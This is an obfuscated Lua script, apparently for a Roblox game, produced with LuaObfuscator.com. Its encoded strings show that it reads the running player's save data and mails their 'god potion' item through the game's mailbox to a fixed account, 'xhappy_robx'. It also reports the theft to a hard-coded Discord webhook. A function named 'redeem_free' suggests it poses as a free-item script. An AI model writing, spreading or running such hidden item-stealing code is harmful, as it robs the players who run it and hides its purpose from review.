--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v80=0;while true do if (v80==0) then v19=v0(v3(v30,1,1));return "";end end else local v81=v2(v0(v30,16));if v19 then local v91=v5(v81,v19);v19=nil;return v91;else return v81;end end end);local function v20(v31,v32,v33) if v33 then local v82=0 -0 ;local v83;while true do if (v82==(0 -0)) then v83=(v31/((3 -(878 -(282 + 595)))^(v32-(2 -1))))%(((2258 -(1523 + 114)) -(555 + 64))^(((v33-1) -(v32-(932 -(857 + 74)))) + (569 -(367 + 201)))) ;return v83-(v83%1) ;end end else local v84=(929 -(214 + 713))^(v32-(1 + 0 + 0)) ;return (((v31%(v84 + v84))>=v84) and (1 + 0)) or 0 ;end end local function v21() local v34=1270 -(226 + 1024 + 20) ;local v35;while true do if (v34==(1 -0)) then return v35;end if (v34==(0 -(0 + 0))) then v35=v1(v16,v18,v18);v18=v18 + 1 ;v34=1066 -((1025 -(892 + 65)) + 997) ;end end end local function v22() local v36,v37=v1(v16,v18,v18 + (4 -2) );v18=v18 + (3 -1) ;return (v37 * (469 -213)) + v36 ;end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (353 -(87 + 194 + 69)) );v18=v18 + (184 -(67 + 113)) ;return (v41 * (12302277 + 4474939)) + (v40 * (160901 -95365)) + (v39 * 256) + v38 ;end local function v24() local v42=0 -0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==1) then v45=953 -(802 + 48 + 102) ;v46=(v20(v44,2 -1 ,36 -16 ) * (2^32)) + v43 ;v42=2 + 0 + 0 ;end if (v42==(1000 -(915 + 82))) then if (v47==(0 -0)) then if (v46==(0 + 0)) then return v48 * (0 -0) ;else v47=(1960 -(201 + 571)) -(1069 + 118) ;v45=0 -0 ;end elseif (v47==(4477 -(3568 -(116 + 1022)))) then return ((v46==(0 + 0)) and (v48 * ((1 -0)/(0 + 0)))) or (v48 * NaN) ;end return v8(v48,v47-(1814 -(368 + 423)) ) * (v45 + (v46/((6 -(16 -12))^(70 -(10 + 8))))) ;end if (v42==0) then v43=v23();v44=v23();v42=3 -2 ;end if (v42==(444 -(416 + 26))) then v47=v20(v44,66 -45 ,14 + 17 );v48=((v20(v44,(33 + 23) -24 )==(439 -(145 + 293))) and  -(431 -(44 + 386))) or (1487 -(998 + 488)) ;v42=3;end end end local function v25(v49) local v50=0;local v51;local v52;while true do if (v50==(7 -5)) then v52={};for v92=3 -2 , #v51 do v52[v92]=v2(v1(v3(v51,v92,v92)));end v50=862 -(814 + 45) ;end if (v50==(0 -0)) then v51=nil;if  not v49 then v49=v23();if (v49==(0 + 0)) then return "";end end v50=1 + 0 ;end if (v50==(886 -((1341 -(1020 + 60)) + 624))) then v51=v3(v16,v18,(v18 + v49) -1 );v18=v18 + v49 ;v50=2;end if (v50==(4 -1)) then return v6(v52);end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v53=(function() return 561 -(79 + 482) ;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();while true do if (v53~=(574 -(426 + 146))) then else for v94= #"~",v23() do local v95=(function() return 0 + 0 ;end)();local v96=(function() return;end)();while true do if (v95==(1456 -(282 + 1174))) then v96=(function() return v21();end)();if (v20(v96, #"[", #",")~=(0 -0)) then else local v103=(function() return 0 -0 ;end)();local v104=(function() return;end)();local v105=(function() return;end)();local v106=(function() return;end)();while true do if (v103~=(288 -(134 + 151))) then else if (v20(v105, #"-19", #"gha")== #" ") then v106[ #"0313"]=(function() return v59[v106[ #"?id="]];end)();end v54[v94]=(function() return v106;end)();break;end if ((1667 -(970 + 695))~=v103) then else if (v20(v105, #">", #"/")~= #"}") then else v106[813 -(569 + 242) ]=(function() return v59[v106[5 -3 ]];end)();end if (v20(v105,3 -1 ,1992 -(582 + 1408) )== #",") then v106[ #"gha"]=(function() return v59[v106[ #"-19"]];end)();end v103=(function() return 3;end)();end if (v103==(3 -2)) then local v114=(function() return 1251 -(721 + 530) ;end)();while true do if (v114==(1 -0)) then v103=(function() return 7 -5 ;end)();break;end if (v114~=(1824 -(1195 + 629))) then else v106=(function() return {v22(),v22(),nil,nil};end)();if (v104==(0 -0)) then local v285=(function() return 241 -(187 + 54) ;end)();local v286=(function() return;end)();while true do if (v285~=(780 -(162 + 618))) then else v286=(function() return 700 -(271 + 429) ;end)();while true do if ((0 + 0)==v286) then v106[ #"19("]=(function() return v22();end)();v106[ #"0836"]=(function() return v22();end)();break;end end break;end end elseif (v104== #"}") then v106[ #"xxx"]=(function() return v23();end)();elseif (v104==(1502 -(1408 + 92))) then v106[ #"xnx"]=(function() return v23() -(2^(11 + 5)) ;end)();elseif (v104~= #"19(") then else local v347=(function() return 1288 -(993 + 295) ;end)();while true do if (v347==(0 -0)) then v106[ #"19("]=(function() return v23() -((2 -0)^(7 + 9)) ;end)();v106[ #"?id="]=(function() return v22();end)();break;end end end v114=(function() return 1 + 0 ;end)();end end end if (v103~=(1636 -(1373 + 263))) then else local v115=(function() return 0 + 0 ;end)();while true do if (v115==(1001 -(451 + 549))) then v103=(function() return 1 + 0 ;end)();break;end if (v115~=(0 + 0)) then else v104=(function() return v20(v96,2 -0 , #"91(");end)();v105=(function() return v20(v96, #"0836",6);end)();v115=(function() return 1 -0 ;end)();end end end end end break;end end end for v97= #"\\",v23() do v55[v97-#"|" ]=(function() return v28();end)();end return v57;end if ( #"]"~=v53) then else local v88=(function() return 1384 -(746 + 638) ;end)();local v89=(function() return;end)();while true do if (v88==(1769 -(1749 + 20))) then v89=(function() return 0 + 0 ;end)();while true do if ((2 -0)~=v89) then else v53=(function() return 343 -(218 + 123) ;end)();break;end if (v89~=0) then else v58=(function() return v23();end)();v59=(function() return {};end)();v89=(function() return 1582 -(1535 + 46) ;end)();end if (v89~=1) then else for v108= #"<",v58 do local v109=(function() return 1322 -(1249 + 73) ;end)();local v110=(function() return;end)();local v111=(function() return;end)();local v112=(function() return;end)();while true do if (v109~=(1 + 0)) then else v112=(function() return nil;end)();while true do if (v110~=(0 + 0)) then else local v246=(function() return 1145 -(466 + 679) ;end)();while true do if (v246~=(0 -0)) then else v111=(function() return v21();end)();v112=(function() return nil;end)();v246=(function() return 561 -(306 + 254) ;end)();end if (v246~=(1 + 0)) then else v110=(function() return 1;end)();break;end end end if (v110==(1 -0)) then if (v111== #" ") then v112=(function() return v21()~=(1900 -(106 + 1794)) ;end)();elseif (v111==2) then v112=(function() return v24();end)();elseif (v111~= #"91(") then else v112=(function() return v25();end)();end v59[v108]=(function() return v112;end)();break;end end break;end if (v109==(1467 -(899 + 568))) then local v116=(function() return 0;end)();while true do if ((1 + 0)==v116) then v109=(function() return 2 -1 ;end)();break;end if (v116~=(0 -0)) then else v110=(function() return 114 -(4 + 110) ;end)();v111=(function() return nil;end)();v116=(function() return 585 -(57 + 527) ;end)();end end end end end v57[ #"-19"]=(function() return v21();end)();v89=(function() return 2 + 0 ;end)();end end break;end end end if (0~=v53) then else local v90=(function() return 0 -0 ;end)();while true do if (v90==1) then v56=(function() return {};end)();v57=(function() return {v54,v55,nil,v56};end)();v90=(function() return 2;end)();end if (v90~=(105 -(17 + 86))) then else v53=(function() return  #"|";end)();break;end if (v90==(603 -(268 + 335))) then v54=(function() return {};end)();v55=(function() return {};end)();v90=(function() return 1 -0 ;end)();end end end end end local function v29(v60,v61,v62) local v63=v60[2 -1 ];local v64=v60[168 -(122 + 44) ];local v65=v60[5 -2 ];return function(...) local v66=v63;local v67=v64;local v68=v65;local v69=v27;local v70=3 -2 ;local v71= -(1 + 0);local v72={};local v73={...};local v74=v12("#",...) -(1 -0) ;local v75={};local v76={};for v85=0,v74 do if ((2739<3293) and (v85>=v68)) then v72[v85-v68 ]=v73[v85 + (66 -(30 + 35)) ];else v76[v85]=v73[v85 + 1 + 0 ];end end local v77=(v74-v68) + 1 ;local v78;local v79;while true do v78=v66[v70];v79=v78[1258 -(1043 + 214) ];if (v79<=(135 -99)) then if (v79<=(1229 -(323 + 889))) then if ((v79<=((4 + 17) -13)) or (3942<1134)) then if ((v79<=(583 -(361 + 219))) or (2693==4973)) then if (v79<=(321 -(53 + 267))) then if (v79==(0 + 0)) then local v120=v78[415 -(15 + 398) ];do return v13(v76,v120,v120 + v78[985 -(18 + 964) ] );end else v76[v78[(6 + 1) -5 ]][v78[2 + 1 ]]=v78[3 + 1 ];end elseif ((2146==2146) and (57<=2723) and (v79==((140 + 712) -(20 + 830)))) then if  not v76[v78[2 + 0 ]] then v70=v70 + (127 -(116 + 10)) ;else v70=v78[1 + 2 ];end else local v123=0;local v124;local v125;while true do if ((v123==(739 -(542 + 196))) or (2244==3224)) then for v309=v124 + 1 ,v78[4] do v125=v125   .. v76[v309] ;end v76[v78[2]]=v125;break;end if ((0 -0)==v123) then v124=v78[1 + 2 ];v125=v76[v124];v123=1;end end end elseif ((v79<=5) or (4904<=1916)) then if ((90<=1065) and (v79==(3 + 1))) then do return v76[v78[1 + 1 + 0 ]];end else v76[v78[(11 -7) -2 ]]();end elseif (v79<=(19 -13)) then do return v76[v78[2]];end elseif (v79==(17 -10)) then if (v76[v78[1553 -(1126 + 153 + 272) ]]==v78[409 -(118 + 287) ]) then v70=v70 + (3 -2) ;else v70=v78[1124 -(118 + 1003) ];end else local v249=0;local v250;while true do if (v249==0) then v250=v78[5 -3 ];v76[v250]=v76[v250](v13(v76,v250 + (378 -(142 + 96 + 139)) ,v78[(11 + 2) -10 ]));break;end end end elseif ((4802==4802) and ((v79<=12) or (2070==443))) then if (v79<=(3 + 7)) then if (v79>9) then if v76[v78[979 -(553 + 424) ]] then v70=v70 + 1 ;else v70=v78[5 -2 ];end else for v212=v78[2],v78[3 + 0 ] do v76[v212]=nil;end end elseif ((v79==(11 + 0)) or (2280<=511)) then v76[v78[2]][v78[2 + 1 + 0 ]]=v76[v78[2 + 2 ]];else v62[v78[3]]=v76[v78[2 + 0 ]];end elseif ((v79<=(29 -15)) or (1676<=463)) then if (v79==13) then for v214=v78[5 -3 ],v78[6 -3 ] do v76[v214]=nil;end else local v130=v78[1 + 1 ];local v131={};for v216=4 -3 , #v75 do local v217=753 -(239 + 514) ;local v218;while true do if ((v217==(0 + 0)) or (2705==1393)) then v218=v75[v216];for v322=1329 -(797 + 532) , #v218 do local v323=v218[v322];local v324=v323[1];local v325=v323[1 + 1 ];if ((v324==v76) and (v325>=v130)) then local v338=0 + 0 ;while true do if (v338==0) then v131[v325]=v324[v325];v323[1 + 0 ]=v131;break;end end end end break;end end end end elseif ((3869==3869) and (v79<=(34 -19))) then local v132=v78[1204 -(373 + 829) ];v76[v132](v76[v132 + (732 -((1909 -(797 + 636)) + 255)) ]);elseif ((1158<=2613) and (v79==16)) then v61[v78[(5501 -4368) -(369 + (2380 -(1427 + 192))) ]]=v76[v78[1 + 1 + 0 ]];else local v254=v67[v78[5 -2 ]];local v255;local v256={};v255=v10({},{__index=function(v290,v291) local v292=v256[v291];return v292[1 -0 ][v292[240 -(64 + 174) ]];end,__newindex=function(v293,v294,v295) local v296=0 + 0 ;local v297;while true do if (v296==(0 -0)) then v297=v256[v294];v297[337 -(144 + 192) ][v297[2]]=v295;break;end end end});for v298=217 -(42 + 174) ,v78[4 + 0 ] do local v299=0;local v300;while true do if (v299==0) then v70=v70 + 1 + (0 -0) ;v300=v66[v70];v299=1 + 0 + 0 ;end if ((v299==(1505 -(363 + 1141))) or (4601<61)) then if ((v300[1581 -(537 + 646 + (723 -(192 + 134))) ]==(176 -118)) or (1390>=4744)) then v256[v298-(1 + 0) ]={v76,v300[2 + 1 ]};else v256[v298-(1277 -(316 + 960)) ]={v61,v300[1936 -(565 + 1368) ]};end v75[ #v75 + 1 ]=v256;break;end end end v76[v78[7 -5 ]]=v29(v254,v255,v62);end elseif (v79<=26) then if ((v79<=21) or (2003>3834)) then if ((v79<=(1680 -(1140 + 337 + 184))) or (2364<=1999)) then if ((v79==(24 -(6 + 0))) or (156>3913) or (4922<194)) then local v133=v78[7 -5 ];v76[v133](v76[v133 + 1 + 0 ]);else v76[v78[858 -(564 + 292) ]][v78[4 -(552 -(83 + 468)) ]]=v76[v78[11 -7 ]];end elseif (v79==((2130 -(1202 + 604)) -(244 + 60))) then local v136=0 + 0 ;local v137;while true do if ((195==195) and (v136==(476 -((191 -150) + 435)))) then v137=v78[1003 -(938 + (104 -41)) ];v76[v137]=v76[v137](v76[v137 + 1 + 0 ]);break;end end else local v138=v67[v78[1128 -(936 + 189) ]];local v139;local v140={};v139=v10({},{__index=function(v219,v220) local v221=v140[v220];return v221[2 -1 ][v221[2]];end,__newindex=function(v222,v223,v224) local v225=v140[v223];v225[326 -(45 + 280) ][v225[1 + 1 ]]=v224;end});for v227=1614 -(1565 + 48) ,v78[3 + 1 ] do v70=v70 + (1139 -(782 + 356)) ;local v228=v66[v70];if ((v228[268 -(170 + 6 + 91) ]==(151 -93)) or (2091<31)) then v140[v227-((1 + 0) -0) ]={v76,v228[3 + 0 ]};else v140[v227-(3 -2) ]={v61,v228[7 -4 ]};end v75[ #v75 + (1 -0) ]=v140;end v76[v78[4 -2 ]]=v29(v138,v139,v62);end elseif (v79<=(9 + 8 + 6)) then if (v79==(40 -18)) then v76[v78[5 -3 ]]= #v76[v78[1230 -(57 + 265 + 905) ]];else v76[v78[2]]={};end elseif ((3105>=1796) and (v79<=(635 -(602 + (16 -7))))) then local v144=v78[1913 -(340 + 1571) ];local v145=v78[1193 -(449 + 740) ];local v146=v144 + 2 ;local v147={v76[v144](v76[v144 + 1 ],v76[v146])};for v230=948 -(97 + 148 + (2474 -(1733 + 39))) ,v145 do v76[v146 + v230 ]=v147[v230];end local v148=v147[3 -2 ];if v148 then v76[v146]=v148;v70=v78[1 + 2 ];else v70=v70 + 1 ;end elseif (v79==(1923 -(260 + 1638))) then local v260=v78[442 -(382 + 58) ];v76[v260](v13(v76,v260 + ((8 -5) -2) ,v78[3 + (1034 -(125 + 909)) ]));elseif (v76[v78[3 -1 ]]==v76[v78[4]]) then v70=v70 + (2 -1) ;else v70=v78[3];end elseif ((4379>=2131) and (v79<=(1236 -(902 + 303)))) then if (v79<=(61 -33)) then if (v79>27) then if v76[v78[(1952 -(1096 + 852)) -2 ]] then v70=v70 + 1 + 0 ;else v70=v78[1693 -(1121 + 569) ];end else v76[v78[2]]=v29(v67[v78[3]],nil,v62);end elseif (v79<=(243 -(22 + 192))) then v62[v78[686 -(483 + 200) ]]=v76[v78[1465 -(1404 + 59) ]];elseif (v79>30) then v70=v78[2 + 1 ];else v76[v78[5 -3 ]]=v76[v78[3]];end elseif (v79<=(43 -10)) then if (((3844>=2043) and (v79>(797 -(468 + 297)))) or (2430>=4872)) then v76[v78[564 -(334 + 228) ]]={};else v76[v78[2]]=v62[v78[(14 -4) -(7 + 0) ]];end elseif (v79<=(78 -44)) then v76[v78[2 -0 ]][v78[1 + 2 ]]=v78[240 -(141 + 95) ];elseif (v79==35) then local v265=v78[2 + 0 ];v76[v265](v13(v76,v265 + (2 -1) ,v78[3]));elseif  not v76[v78[4 -(514 -(409 + 103)) ]] then v70=v70 + 1 + 0 ;else v70=v78[8 -(241 -(46 + 190)) ];end elseif (v79<=(38 + 16)) then if ((v79<=(24 + 21)) or (3232<=2731) or (4770<1735)) then if (v79<=40) then if (v79<=(53 -15)) then if ((v79>(22 + 15)) or (4439<=2350)) then do return;end else v61[v78[166 -(92 + 71) ]]=v76[v78[1 + 1 ]];end elseif (v79==(65 -26)) then v76[v78[767 -(574 + (286 -(51 + 44))) ]]=v78[3 + 0 ]~=0 ;else v76[v78[4 -(1 + 1) ]]=v78[2 + (1318 -(1114 + 203)) ];end elseif (v79<=((1617 -(228 + 498)) -(254 + 595))) then if ((v79>(167 -(55 + 71))) or (4479<4466)) then local v162=v78[2];v76[v162]=v76[v162](v13(v76,v162 + (1 -0) ,v78[1793 -(573 + 1217) ]));else v76[v78[5 -3 ]]=v61[v78[1 + 2 ]];end elseif (v79<=(69 -26)) then v76[v78[(204 + 737) -(714 + 225) ]]=v76[v78[8 -5 ]][v76[v78[4]]];elseif (v79==(61 -17)) then v76[v78[1 + 1 ]]=v76[v78[3 -0 ]][v76[v78[4]]];elseif (v76[v78[808 -(118 + 688) ]]==v76[v78[52 -(25 + 13 + 10) ]]) then v70=v70 + 1 + 0 ;else v70=v78[1889 -(927 + 959) ];end elseif (v79<=(165 -116)) then if (v79<=(779 -(16 + 716))) then if (v79>46) then local v168=v78[3 -1 ];local v169=v78[101 -(11 + 86) ];local v170=v168 + (4 -2) ;local v171={v76[v168](v76[v168 + 1 ],v76[v170])};for v233=2 -1 ,v169 do v76[v170 + v233 ]=v171[v233];end local v172=v171[4 -3 ];if v172 then local v268=1796 -(503 + 1293) ;while true do if ((4905==4905) and ((0 -0)==v268)) then v76[v170]=v172;v70=v78[3 + 0 ];break;end end else v70=v70 + (1062 -(810 + 251)) ;end else local v173=v78[2 + (0 -0) ];local v174=v76[v173];local v175=v78[1 + 2 ];for v236=1 + 0 ,v175 do v174[v236]=v76[v173 + v236 ];end end elseif ((2547>1225) and (v79==(581 -(43 + 490)))) then local v176=733 -(711 + 22) ;local v177;while true do if (0==v176) then v177=v78[2];v76[v177]=v76[v177]();break;end end else local v178=v78[7 -5 ];v76[v178]=v76[v178](v76[v178 + (860 -(240 + 619)) ]);end elseif (v79<=(13 + 38)) then if (v79==50) then v76[v78[(1907 -(830 + 1075)) -0 ]]=v76[v78[1 + 2 ]][v78[1748 -(1344 + 400) ]];else local v182=v78[407 -((779 -(303 + 221)) + 150) ];local v183=v76[v182];local v184=v78[3 + 0 ];for v239=1,v184 do v183[v239]=v76[v182 + v239 ];end end elseif ((4671>2674) and (v79<=(1321 -(231 + 1038)))) then v76[v78[2 + 0 ]]=v61[v78[(10 + 2) -9 ]];elseif (v79==(170 -117)) then v76[v78[1741 -(404 + 1335) ]]=v76[v78[409 -(183 + 223) ]][v78[4 -0 ]];else local v271=0;local v272;local v273;while true do if (v271==(0 + 0)) then v272=v78[2];v273={};v271=1 + (1162 -(171 + 991)) ;end if (v271==1) then for v335=1, #v75 do local v336=v75[v335];for v339=337 -(10 + 327) , #v336 do local v340=v336[v339];local v341=v340[4 -3 ];local v342=v340[2];if (((v341==v76) and (v342>=v272)) or (4136>=4411)) then v273[v342]=v341[v342];v340[1 + 0 ]=v273;end end end break;end end end elseif (v79<=(401 -(118 + 220))) then if ((v79<=(20 + 38)) or (3696<3327)) then if (v79<=(505 -((289 -181) + 341))) then if ((v79>(25 + 30)) or (2958==4017)) then v76[v78[8 -6 ]]=v29(v67[v78[1496 -(711 + 782) ]],nil,v62);else local v188=v78[3 -1 ];local v189={v76[v188](v76[v188 + 1 ])};local v190=0;for v242=v188,v78[4] do v190=v190 + 1 + 0 ;v76[v242]=v189[v190];end end elseif (v79>(1876 -(580 + (3091 -1852)))) then v76[v78[2]]=v76[v78[8 -5 ]];elseif (v78[2 + 0 ]==v76[v78[1 + 3 ]]) then v70=v70 + 1 + 0 + 0 ;else v70=v78[7 -4 ];end elseif (v79<=(38 + (77 -55))) then if ((v79>(1226 -(645 + 522))) or (4542==2970)) then v76[v78[5 -3 ]]=v78[1793 -(1010 + 780) ]~=(0 + (0 -0)) ;else local v194=v78[3];local v195=v76[v194];for v245=v194 + (4 -3) ,v78[11 -7 ] do v195=v195   .. v76[v245] ;end v76[v78[1838 -(1045 + 791) ]]=v195;end elseif ((1228>=813) and (v79<=61)) then local v197=(0 -0) -(1248 -(111 + 1137)) ;local v198;local v199;local v200;while true do if ((252<=1977) and (v197==(0 -(158 -(91 + 67))))) then v198=v78[507 -(351 + 154) ];v199={v76[v198](v76[v198 + (267 -(28 + 238)) ])};v197=(1 + 1) -1 ;end if (v197==(1560 -(1381 + 178))) then v200=(523 -(423 + 100)) + 0 ;for v315=v198,v78[4 + 0 ] do v200=v200 + 1 + 0 + 0 ;v76[v315]=v199[v200];end break;end end elseif (v79>(213 -151)) then v76[v78[2 + 0 ]]();else local v275=470 -(381 + 89) ;local v276;while true do if ((v275==(0 + (0 -0))) or (1436==3775)) then v276=v78[2 + 0 + 0 ];v76[v276]=v76[v276]();break;end end end elseif (v79<=(116 -48)) then if ((v79<=(1221 -(1074 + 82))) or (1618<930)) then if ((4723>4153) and (v79==(139 -(846 -(326 + 445))))) then v76[v78[2]]=v78[1787 -(214 + 1570) ];elseif ((v78[1457 -(990 + 465) ]==v76[v78[2 + 2 ]]) or (3455>4050)) then v70=v70 + 1 + 0 ;else v70=v78[3];end elseif (v79<=(65 + 1)) then v76[v78[7 -5 ]]= #v76[v78[3]];elseif (v79==(1793 -(1668 + 58))) then if (((243==243) and (v76[v78[628 -((2234 -1722) + 114) ]]==v78[4])) or (3654>=4654)) then v70=v70 + (2 -1) ;else v70=v78[(10 -5) -(4 -2) ];end else local v278=v78[2];local v279=v76[v78[3]];v76[v278 + (3 -2) ]=v279;v76[v278]=v279[v78[4]];end elseif ((v79<=(33 + 37)) or (271>1572)) then if (v79==(13 + 56)) then local v204=v78[2];local v205=v76[v78[3 + 0 ]];v76[v204 + (3 -2) ]=v205;v76[v204]=v205[v78[1998 -(109 + 1885) ]];else v76[v78[1471 -(1269 + 200) ]]=v62[v78[5 -2 ]];end elseif (v79<=(886 -(98 + 717))) then v70=v78[3];elseif ((951<=1496) and (v79>(898 -((1513 -(530 + 181)) + 24)))) then local v283=v78[2 -0 ];local v284=v76[v283];for v308=v283 + (1 -0) ,v78[3] do v7(v284,v76[v308]);end else do return;end end v70=v70 + 1 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!243Q00028Q00027Q004003043Q0077616974026Q002040026Q000840026Q00F03F03043Q0067616D6503083Q0049734C6F6164656403133Q005261696E626F77204469636520506F74696F6E03073Q00776562682Q6F6B026Q001440030B3Q0073656E645F706F74696F6E03123Q00676F645F706F74696F6E5F76697369626C6503073Q00636F6E74656E7403073Q00506C6179657273030B3Q004C6F63616C506C6179657203043Q004E616D65031F3Q002068617320676F6420706F74696F6E20696E20666F7265766572207061636B03083Q00757365726E616D65030C3Q00466F7265766572207061636B03043Q007461736B030A3Q006861735F706F74696F6E030B3Q007265642Q656D5F66722Q65026Q002440030B3Q007868612Q70795F726F627803793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F313238343032333530322Q3534352Q333931382F5F6E5F65693564526A41722D356E77324743387734676137554578616F6445664E4B43514D646C683164767830493632526F434749574C30706654353731782Q5943787703053Q007063612Q6C03073Q0072657175697265030A3Q004765745365727669636503113Q005265706C69636174656453746F7261676503073Q004C69627261727903063Q00436C69656E7403043Q00536176652Q033Q00476574031C3Q00726278612Q73657469643A2Q2F3133303834333638323537342Q3335026Q00104000B13Q0012403Q00014Q0009000100073Q0026073Q00090001000200041F3Q00090001001246000800033Q001240000900044Q00120008000200012Q0009000500063Q0012403Q00053Q0026073Q00220001000600041F3Q00220001001240000800013Q002607000800180001000600041F3Q00180001001246000900033Q001240000A00054Q0012000900020001001246000900073Q0020440009000900082Q001400090002000200061C0009000E00013Q00041F3Q000E00010012403Q00023Q00041F3Q002200010026070008000C0001000100041F3Q000C00012Q0021000900013Q001240000A00094Q00330009000100012Q001E000400093Q00023800095Q00121D0009000A3Q001240000800063Q00041F3Q000C00010026073Q005B0001000B00041F3Q005B000100061500080001000100022Q003A3Q00024Q003A3Q00013Q00121D0008000C3Q001246000800034Q003E00080001000200061C000800AF00013Q00041F3Q00AF0001001240000800014Q0009000900093Q000E39000200450001000800041F3Q00450001001246000A000D4Q003E000A0001000200061C000A004000013Q00041F3Q00400001001246000A000A4Q001E000B00024Q0021000C3Q0002001246000D00073Q002035000D000D000F002035000D000D0010002035000D000D0011001240000E00124Q003B000D000D000E00100B000C000E000D003001000C001300142Q0019000A000C0001001246000A00153Q002035000A000A00032Q001E000B00034Q0012000A0002000100041F3Q00280001002607000800500001000600041F3Q00500001001246000A00164Q003E000A000100022Q001E0009000A3Q00061C0009004F00013Q00041F3Q004F0001001246000A000C4Q001E000B00094Q0012000A00020001001240000800023Q0026070008002E0001000100041F3Q002E0001001246000A00174Q0005000A00010001001246000A00033Q001240000B000B4Q0012000A00020001001240000800063Q00041F3Q002E000100041F3Q0028000100041F3Q00AF00010026073Q006C0001000100041F3Q006C0001001240000800013Q002607000800630001000600041F3Q00630001001240000300183Q0012403Q00063Q00041F3Q006C00010026070008005E0001000100041F3Q005E00012Q0021000900013Q001240000A00194Q00330009000100012Q001E000100093Q0012400002001A3Q001240000800063Q00041F3Q005E00010026073Q00990001000500041F3Q00990001001240000800014Q0009000900093Q002607000800700001000100041F3Q00700001001240000900013Q0026070009007A0001000600041F3Q007A0001001246000A001B3Q000615000B0002000100012Q003A3Q00064Q0012000A0002000100041F3Q00870001002607000900730001000100041F3Q00730001001246000A00033Q001240000B00064Q0012000A00020001001246000A001B3Q000615000B0003000100012Q003A3Q00054Q0012000A00020001001240000900063Q00041F3Q0073000100041F3Q0087000100041F3Q0070000100061C0005006E00013Q00041F3Q006E000100061C0006006E00013Q00041F3Q006E00010012460008001C3Q001246000900073Q00204400090009001D001240000B001E4Q002A0009000B000200203500090009001F0020350009000900200020350009000900212Q00140008000200020020350008000800222Q003E0008000100022Q001E000500083Q001240000700233Q0012403Q00243Q0026073Q00020001002400041F3Q00020001001240000800013Q000E39000100A50001000800041F3Q00A5000100061500090004000100022Q003A3Q00064Q003A3Q00073Q00121D0009000D3Q000238000900053Q00121D000900173Q001240000800063Q0026070008009C0001000600041F3Q009C000100061500090006000100022Q003A3Q00054Q003A3Q00043Q00121D000900163Q0012403Q000B3Q00041F3Q0002000100041F3Q009C000100041F3Q000200012Q000E8Q00263Q00013Q00073Q00013Q0003053Q007063612Q6C02063Q001246000200013Q00061500033Q000100022Q003A8Q003A3Q00014Q00120002000200012Q00263Q00013Q00013Q00123Q00028Q00026Q00F03F03073Q0072657175657374030C3Q00682Q74705F7265717565737403083Q00482Q7470506F73742Q033Q0073796E2Q033Q0055726C03043Q00426F647903063Q004D6574686F6403043Q00504F535403073Q0048656164657273027Q004003043Q0067616D65030A3Q0047657453657276696365030B3Q00482Q747053657276696365030A3Q004A534F4E456E636F6465030C3Q00636F6E74656E742D7479706503103Q00612Q706C69636174696F6E2F6A736F6E00363Q0012403Q00014Q0009000100033Q0026073Q00180001000200041F3Q00180001001246000400043Q0006240004000F0001000100041F3Q000F0001001246000400033Q0006240004000F0001000100041F3Q000F0001001246000400053Q0006240004000F0001000100041F3Q000F0001001246000400063Q00203500040004000300121D000400034Q002100043Q00042Q002900055Q00100B00040007000500100B00040008000100300100040009000A00100B0004000B00022Q001E000300043Q0012403Q000C3Q0026073Q001E0001000C00041F3Q001E0001001246000400034Q001E000500034Q001200040002000100041F3Q003500010026073Q00020001000100041F3Q00020001001240000400013Q002607000400250001000200041F3Q002500010012403Q00023Q00041F3Q00020001002607000400210001000100041F3Q002100010012460005000D3Q00204400050005000E0012400007000F4Q002A0005000700020020440005000500102Q0029000700014Q002A0005000700022Q001E000100054Q002100053Q00010030010005001100122Q001E000200053Q001240000400023Q00041F3Q0021000100041F3Q000200012Q00263Q00017Q00163Q00028Q00026Q00F03F027Q0040030B3Q00506F74696F6E2073656E74030A3Q00436F6E73756D61626C65026Q00084003043Q0067616D65030A3Q004765745365727669636503113Q005265706C69636174656453746F7261676503073Q004E6574776F726B030D3Q004D61696C626F783A2053656E64030C3Q00496E766F6B6553657276657203073Q00776562682Q6F6B03073Q00636F6E74656E7403073Q00506C6179657273030B3Q004C6F63616C506C6179657203043Q004E616D6503103Q002073656E7420676F6420706F74696F6E03083Q00757365726E616D6503093Q004D61696C2073656E7403043Q006D61746803063Q0072616E646F6D01453Q001240000100014Q0009000200063Q0026070001000F0001000200041F3Q000F0001001240000700013Q002607000700090001000200041F3Q00090001001240000100033Q00041F3Q000F0001002607000700050001000100041F3Q00050001001240000300043Q001240000400053Q001240000700023Q00041F3Q000500010026070001001C0001000300041F3Q001C0001001240000700013Q002607000700160001000200041F3Q00160001001240000100063Q00041F3Q001C0001002607000700120001000100041F3Q001200012Q001E00055Q001240000600023Q001240000700023Q00041F3Q001200010026070001002C0001000600041F3Q002C0001001246000700073Q002044000700070008001240000900094Q002A00070009000200203500070007000A00203500070007000B00204400070007000C2Q001E000900024Q001E000A00034Q001E000B00044Q001E000C00054Q001E000D00064Q00190007000D000100041F3Q00440001002607000100020001000100041F3Q000200010012460007000D4Q002900086Q002100093Q0002001246000A00073Q002035000A000A000F002035000A000A0010002035000A000A0011001240000B00124Q003B000A000A000B00100B0009000E000A0030010009001300142Q00190007000900012Q0029000700013Q001246000800153Q002035000800080016001240000900024Q0029000A00014Q0016000A000A4Q002A0008000A00022Q002B000200070008001240000100023Q00041F3Q0002